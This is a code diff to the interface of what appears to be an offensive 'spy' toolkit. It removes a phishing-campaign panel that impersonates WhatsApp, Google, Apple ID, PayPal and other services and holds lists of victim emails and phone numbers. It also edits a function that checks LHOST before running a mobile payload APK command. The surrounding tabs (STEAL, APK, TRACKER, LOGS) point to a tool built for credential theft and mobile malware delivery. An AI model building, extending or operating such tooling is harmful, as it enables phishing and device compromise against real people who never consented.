@@ -2661,7 +2661,6 @@ textarea.fi{resize:vertical;min-height:48px}
     <div class="tab on" onclick="stab('spy-mob','templates',this)">TEMPLATES</div>
     <div class="tab" onclick="stab('spy-mob','steal',this)">STEAL</div>
     <div class="tab" onclick="stab('spy-mob','apk',this);bMobApk()">APK</div>
-    <div class="tab" onclick="stab('spy-mob','campaigns',this);loadCampaigns()">CAMPAIGNS</div>
     <div class="tab" onclick="stab('spy-mob','tracker',this);loadTracker()">TRACKER</div>
     <div class="tab" onclick="stab('spy-mob','logs',this);loadPhishLogs()">LOGS</div>
     <div class="tab" onclick="stab('spy-mob','guide',this)" style="color:var(--cyan)">GUIDE</div>
@@ -2911,66 +2910,6 @@ textarea.fi{resize:vertical;min-height:48px}
     <div id="mob-apk-srv-area" class="out-area" style="display:none">
       <div class="out-hdr"><span class="out-title">HTTP SERVER</span></div>
       <div class="out-content" id="mob-apk-srv-c"></div>
-    </div>
-  </div>
-
-  <!-- ── CAMPAIGNS ── -->
-  <div id="spy-mob-campaigns" class="tab-content">
-    <div style="display:flex;gap:6px;margin-bottom:10px;align-items:flex-end;flex-wrap:wrap">
-      <div class="ig" style="flex:1;min-width:150px">
-        <div class="lbl">CAMPAIGN NAME</div>
-        <input class="fi" id="phish-new-name" placeholder="Op Mobile Harvest">
-      </div>
-      <div class="ig" style="flex:1;min-width:130px">
-        <div class="lbl">TEMPLATE</div>
-        <select class="fi" id="phish-new-tmpl">
-          <option value="whatsapp">WhatsApp</option>
-          <option value="instagram">Instagram</option>
-          <option value="facebook">Facebook</option>
-          <option value="google">Google</option>
-          <option value="apple">Apple ID</option>
-          <option value="tiktok">TikTok</option>
-          <option value="snapchat">Snapchat</option>
-          <option value="netflix">Netflix</option>
-          <option value="twitter">Twitter/X</option>
-          <option value="telegram">Telegram</option>
-          <option value="paypal">PayPal</option>
-          <option value="custom">Custom</option>
-        </select>
-      </div>
-      <div class="ig" style="flex:1;min-width:150px">
-        <div class="lbl">REDIRECT URL</div>
-        <input class="fi" id="phish-new-redirect" value="https://google.com">
-      </div>
-      <button class="rbtn" style="border-color:var(--red);color:var(--red);padding-bottom:2px" onclick="createCampaign()">+ NEW</button>
-    </div>
-    <div style="display:flex;gap:6px;margin-bottom:8px">
-      <button class="kbtn" onclick="loadCampaigns()">&#x21BB; REFRESH</button>
-    </div>
-    <div id="phish-camp-list" style="display:flex;flex-direction:column;gap:8px">
-      <div class="p-empty">No campaigns. Create one above.</div>
-    </div>
-
-    <div style="margin-top:14px" class="sdiv">TARGETS</div>
-    <div style="display:flex;gap:6px;margin-bottom:6px;align-items:flex-end;flex-wrap:wrap">
-      <div class="ig" style="flex:1">
-        <div class="lbl">CAMPAIGN</div>
-        <select class="fi" id="phish-tgt-camp" onchange="loadCampTargets()">
-          <option value="">&#8212; select &#8212;</option>
-        </select>
-      </div>
-      <button class="kbtn" onclick="loadCampaigns();setTimeout(function(){refreshTgtCampSelect();loadCampTargets()},400)">&#x21BB;</button>
-    </div>
-    <div class="ig" style="margin-bottom:6px">
-      <div class="lbl">EMAILS / N&#218;MEROS (one per line)</div>
-      <textarea class="fi" id="phish-tgt-emails" rows="3" placeholder="victim@gmail.com&#10;+1555000000&#10;admin@corp.com"></textarea>
-    </div>
-    <div style="display:flex;gap:6px;margin-bottom:8px">
-      <button class="rbtn" style="border-color:var(--red);color:var(--red)" onclick="addTargets()">+ ADD TARGETS</button>
-      <button class="kbtn" style="border-color:#4a1020;color:#cc4060" onclick="clearTargets()">CLEAR ALL</button>
-    </div>
-    <div id="phish-tgt-list" style="overflow-x:auto;max-height:200px;overflow-y:auto">
-      <div class="p-empty">Select a campaign first.</div>
     </div>
   </div>
 
@@ -8526,7 +8465,7 @@ function runMobApk() {
   bMobApk();
   const el = document.getElementById('mob-apk-cmd-txt');
   const cmd = el ? el.textContent : '';
-  if (!cmd || cmd.includes('LHOST')) { alert('Set LHOST first.'); return; }
+  if (!gv('mob-apk-lhost')) { alert('Set LHOST first.'); return; }
   execCmd(cmd, 'mob-apk-out-c', 'mob-apk-out-area', 'mob-apk');
 }
 
